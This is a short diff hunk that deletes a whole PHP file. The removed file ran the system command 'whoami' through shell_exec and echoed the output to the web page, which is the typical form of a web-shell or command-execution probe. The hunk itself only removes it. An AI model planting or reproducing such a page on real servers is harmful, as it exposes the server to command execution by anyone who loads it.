@@ -1,5 +1,0 @@
-<?php
-echo "<pre>";
-echo shell_exec("whoami");
-echo "</pre>";
-?>
